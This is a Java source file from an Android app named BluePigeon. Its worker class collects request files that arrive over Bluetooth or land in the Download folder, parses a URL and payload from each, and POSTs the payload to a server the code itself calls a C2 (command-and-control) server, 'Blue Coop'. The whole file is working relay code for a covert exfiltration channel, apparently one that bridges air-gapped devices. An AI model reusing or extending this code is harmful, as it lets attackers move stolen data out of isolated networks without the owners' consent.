package com.csg.bluepigeon.pigeon;

import android.content.Context;

import androidx.annotation.NonNull;
import androidx.work.ListenableWorker;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.csg.bluepigeon.ui.MainActivity;
import com.csg.bluepigeon.util.BlueChirp;
import com.csg.bluepigeon.util.BlueUtils;
import com.csg.bluepigeon.util.Config;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;

import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;

public class BluePigeonListener extends Worker {
    final String TAG = "BluePigeonListener ";
    final String BT_ADDRESS_KEY = "address";
    final String BLUE_REQ_URL_KEY = "Url";
    final String BLUE_REQ_PAYLOAD_KEY = "Payload";

    File bluetoothDir = new File(Config.BLUETOOTH_DIR_PATH);

    BlueChirp blueChirp;
    String jobid;
    String btAddress;
    public BluePigeonListener(
            @NonNull Context context,
            @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public ListenableWorker.Result doWork() {
        blueChirp = new BlueChirp(Config.LOGGING_DIR_PATH);
        btAddress = getInputData().getString(BT_ADDRESS_KEY);
        String bpName = getInputData().getString("bpName");
        String blueCoopName = getInputData().getString("blueCoopName");
        Long tsLong = System.currentTimeMillis()%100000;
        jobid = tsLong.toString();

        // check if blue request exists in either bluetooth or download folder
        File[] bluetoothDirFiles = bluetoothDir.listFiles();
        File downloadDir = new File(Config.DOWNLOAD_DIR_PATH);
        File[] downloadDirFiles = downloadDir.listFiles();
        File[] combinedFileList = new File[bluetoothDirFiles.length + downloadDirFiles.length];
        System.arraycopy(bluetoothDirFiles, 0, combinedFileList, 0, bluetoothDirFiles.length);
        System.arraycopy(downloadDirFiles, 0, combinedFileList, bluetoothDirFiles.length, downloadDirFiles.length);

        File blueReq = null;
        for (File file : combinedFileList) {
            if (file.getName().startsWith(BlueUtils.BLUE_REQ_PREFIX)) {
                blueReq = file;
                break;
            }
        }

        // if blue requests exist
        if (blueReq != null) {
            try {
                //new BlueChirp(telegramHeader + "tweet tweet i received a steaming load from BP: " + blueReq.getName()).execute();
                blueChirp.log(TAG + "doWork: found file", "debug");

                // read file
                String blueReqStr = readFileContent(blueReq);
                blueChirp.log(TAG + "doWork: file content: " + blueReqStr, "debug");

                // parse blue request
                ArrayList<String> insectRequest = parseBlueReq(blueReqStr);
                String url = insectRequest.get(0);
                String payload = insectRequest.get(1);
                blueChirp.log(TAG + "doWork: url = " + url + " payload = " + payload, "debug");
                blueChirp.log(TAG + "doWork: payload length " + payload.length(), "debug");

                // send to C2 Server a.k.a. Blue Coop
                String response = sendToC2(url, payload, btAddress);
                blueChirp.log(TAG + "doWork: C2 response is " + response, "debug");

            } catch (Exception e) {
                blueChirp.log(TAG + "doWork: " + e.getMessage(), "error");

            }
            
        } else {
            blueChirp.log(TAG + "doWork: could not find any blueReq files", "error");
            return Result.failure();
        }

        return Result.success();
    }

    /***
     * Reads file content and deletes it after
     * @param file
     * @return file content
     * @throws IOException
     */
    private String readFileContent(File file) throws IOException {
        StringBuilder text = new StringBuilder();
        try {
            blueChirp.log(TAG + "readFileContent: reading file...", "debug");
            BufferedReader br = new BufferedReader(new FileReader(file));
            String line;

            while ((line = br.readLine()) != null) {
                text.append(line);
                text.append('\n');
            }
            br.close();
            blueChirp.log(TAG + "readFileContent: reading file completed...", "debug");
        }
        catch (IOException e) {
            blueChirp.log(TAG + "readFileContent: error when reading file", "error");
            throw e;
        } finally {
            // move file to backup folder
            file.renameTo(new File(Config.BACKUP_DIR_PATH + file.getName()));
        }
        blueChirp.log(TAG + "readFileContent: Successfully read file", "debug");
        return text.toString();
    }

    /***
     * Parse a Blue Request and extract url, payload
     * @param jsonStr
     * @return ArrayList with url and payload
     * @throws JSONException
     */
    private ArrayList<String> parseBlueReq(String jsonStr) throws JSONException {
        blueChirp.log(TAG + "parseBlueReq: parsing blue request...", "debug");
        ArrayList<String> result = new ArrayList<>();
        try {
            JSONObject json = new JSONObject(jsonStr);
            String url = json.getString(BLUE_REQ_URL_KEY);
            String payload = json.getString(BLUE_REQ_PAYLOAD_KEY);
            result.add(url);
            result.add(payload);
        } catch (JSONException e) {
            blueChirp.log(TAG + "parseBlueReq: parsing blue request failed", "error");
            throw e;
        }
        blueChirp.log(TAG + "successfully parsed blue request", "debug");
        return result;
    }
    
    /***
     * Sends base64 payload string to Blue Coop, creates a file to store the HTTP response
     * @param urlString, payload, address(without colons)
     * @return arraylist with url, payload
     */
    private String sendToC2(String urlString, String payload, String address) throws IOException, JSONException {
        blueChirp.log(TAG + "sendToC2: sending to Blue Coop...", "debug");

        String response = null;
        try {
            // url encode payload
            payload = "p=" + URLEncoder.encode(payload, "utf-8");
            byte[] postData = payload.getBytes( StandardCharsets.UTF_8 );
            int postDataLength = postData.length;

            // send POST request to C2
            String c2Url = MainActivity.BLUE_COOP_URL + urlString;
            URL url = new URL(c2Url);
            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            httpURLConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            httpURLConnection.setRequestProperty("Accept-Language", "en-SG");
            httpURLConnection.setRequestProperty("charset", "utf-8");
            httpURLConnection.setRequestProperty("Content-Length", Integer.toString(postDataLength ));
            httpURLConnection.setInstanceFollowRedirects(false);
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setUseCaches(false);
            blueChirp.log(TAG + "sendToC2: sending POST req to " + c2Url, "debug");

            try(DataOutputStream wr = new DataOutputStream(httpURLConnection.getOutputStream())) {
                wr.write(postData);
            }

            blueChirp.log(TAG + "sendToC2: POST req response code " + httpURLConnection.getResponseCode(), "debug");
            try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()))) {
                StringBuilder responseBuilder = new StringBuilder();
                String responseLine = null;
                while ((responseLine = bufferedReader.readLine()) != null) {
                    responseBuilder.append(responseLine.trim());
                }

                response = responseBuilder.toString();
            }

        } catch (Exception e) {
            blueChirp.log(TAG + "sendToC2: Failed to send to Blue Coop", "error");
            // blueResp.delete();
            throw e;
        }
        blueChirp.log(TAG + "sendToC2: Successfully sent to Blue Coop", "debug");
        return response;
    }
}
